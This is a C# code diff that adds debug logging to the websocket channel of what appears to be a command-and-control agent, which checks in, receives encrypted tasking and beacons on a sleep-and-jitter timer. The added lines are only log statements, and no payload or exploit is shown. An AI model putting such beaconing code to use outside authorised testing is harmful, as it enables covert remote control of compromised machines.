@@ -68,17 +68,22 @@ namespace Workflow.Channels.Websocket
             });
 
             this._client = new WebsocketClient(new Uri(this.url), factory);
+            DebugLog.Log($"Websocket URL constructed: {this.url}");
+            DebugLog.Log("Websocket client setup complete");
             this._client.MessageReceived.Subscribe(msg =>
             {
+                DebugLog.Log("Websocket message received");
                 WebSocketMessage wm = JsonSerializer.Deserialize<WebSocketMessage>(msg.Text, WebsocketJsonContext.Default.WebSocketMessage);
 
                 if (!checkedIn)
                 {
+                    DebugLog.Log("Websocket received checkin response");
                     cir = JsonSerializer.Deserialize(this.crypt.Decrypt(wm.data), CheckinResponseJsonContext.Default.CheckinResponse);
                     checkinAvailable.Set();
                     return;
                 }
 
+                DebugLog.Log("Websocket received tasking response");
                 GetTaskingResponse gtr = JsonSerializer.Deserialize(this.crypt.Decrypt(wm.data), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                 TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
 
@@ -93,8 +98,10 @@ namespace Workflow.Channels.Websocket
         {
             do
             {
+                DebugLog.Log($"Websocket checkin attempt {this.connectAttempt + 1}/{this.maxAttempts}");
                 if (await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                 {
+                    DebugLog.Log("Websocket checkin send succeeded");
                     break;
                 }
 
@@ -104,7 +111,7 @@ namespace Workflow.Channels.Websocket
             checkinAvailable.Wait();
 
             this.checkedIn = true;
-
+            DebugLog.Log("Websocket checkin complete");
 
             return this.cir;
         }
@@ -114,22 +121,27 @@ namespace Workflow.Channels.Websocket
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
                 await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
+                DebugLog.Log("Websocket beacon iteration starting");
 
                 if (!this.messageManager.HasResponses())
                 {
+                    DebugLog.Log("Websocket beacon no responses to send");
                     continue;
                 }
                 try
                 {
+                    DebugLog.Log("Websocket beacon sending responses");
                     await this.Send(messageManager.GetAgentResponseString());
                 }
                 catch (Exception e)
                 {
                     this.connectAttempt++;
+                    DebugLog.Log($"Websocket beacon send failed, attempt {this.connectAttempt}/{this.maxAttempts}");
                 }
 
                 if (this.connectAttempt >= this.maxAttempts)
                 {
+                    DebugLog.Log("Websocket beacon max attempts reached, shutting down");
                     this.cancellationTokenSource.Cancel();
                     await this._client.Stop(WebSocketCloseStatus.EndpointUnavailable, "Exiting");
                     this._client.Dispose();
@@ -147,6 +159,7 @@ namespace Workflow.Channels.Websocket
             {
                 if (this._client.IsRunning)
                 {
+                    DebugLog.Log("Websocket Send: client is running");
                     json = this.crypt.Encrypt(json);
 
                     WebSocketMessage m = new WebSocketMessage()
@@ -159,10 +172,16 @@ namespace Workflow.Channels.Websocket
                     string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
 
                     this._client.Send(message);
+                    DebugLog.Log("Websocket Send succeeded");
+                }
+                else
+                {
+                    DebugLog.Log("Websocket Send: client not running");
                 }
             }
             catch
             {
+                DebugLog.Log("Websocket Send failed");
                 return false;
             }
 
